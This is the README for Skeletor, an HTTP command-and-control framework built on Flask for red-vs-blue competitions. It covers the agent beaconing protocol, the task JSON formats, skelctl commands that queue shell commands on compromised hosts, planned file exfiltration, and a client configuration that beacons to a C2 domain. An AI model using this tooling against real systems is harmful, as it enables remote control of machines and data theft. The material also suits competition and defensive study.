# Skeletor

Skeletor is a HTTP C2 built upon the Flask framework designed for red vs. blue cyber security competitions.
Skeletor clients communicate on a beaconing system, sending outbound POST requests to the Skeletor server's **/tasks** route every 120 seconds containing JSON data in the format:
```json
{
  "agent_id": "192.168.1.9"
}
```  
where agent_id is typically the local ip address of the agent, which is important for allowing us to see the local ip for identifying boxes in many red vs blue competitions. Optionally, agent_id could have 
a different identifier, depending on how you wish to identify different agents. If there are one or more tasks assigned to them, this will retrieve the first task, which they will then handle and return the result back to the server.

# Tasks
Tasks are Skeletor's way of assigning work to clients. When a client send a POST request to the server's **/tasks** route containing there agent_id, if a task exists with a matching agent_id and a completed field with a value of False, 
the client receives a JSON object in the form:
```json
{
  "action": "command||download||upload",
  "command": "NULL||command",
  "filename": "NULL||filename",
  "destination": "NULL||destination"
}
```
Currently, the only supported action for Skeletor clients is command, where the agents will execute the command via bash for Linux systems and Powershell for Windows systems, then return a JSON object in the
form of 
```json
{
  "agent_id": "10.1.1.9"
  "task_id": 79
  "result": "root"
  "returncode": 0
}
```
where task_id is assigned by the server to the task when it is created to keep track of different tasks.  

In future updates, the download and update actions are planned to be added, which will allow client to download files from the server and exfiltrate files.

# Usage
## Server
Currently, the skelctl command line utility is the primary way of interacting with the skeletor server. To view all agents, use the command:
```
skelctl get agents
```
which will return a list of agent IDs and whether they are "active" or "inactive" (inactive means they haven't beaconed out to the server in 5 minutes). To issue a command, you must first set Skeletor's **targets**, a list of agent IDs
which management tools like skelctl can retrieve to know which agents to create tasks for. To do this, use the command:
```
skelctl set targets 10.0.0.0,10.0.0.1
```
with the last argument being a list of comma seperated agent IDs of the agents you wish to target. Then run the **skelctl cmd** command to make a task for each agent in the targets to execute the given command.
```
skelctl cmd "whoami ; id"
```
## Client
To use the client, make any configuration changes needed in the main function and run the python file, and it will begin beaconing out. There will soon be a Go client, it is currently in development but is not yet stable. The client has three configurable arguments when creating an instance of the Client class: server_ip (mandatory, the IP or FQDN of the host the server is running on), port (port the server is listening on, defaults to 80), and callback_interval (the interval, in seconds, of how often the client should beacon out. Default is 120). The following codeblock illustrates what the main function of client.py looks like when specifying all arguments to the client.
```python
def main():
    client = Client(server_ip="thisisac2.xyz", port=80,callback_interval=120)
    client.run()
```
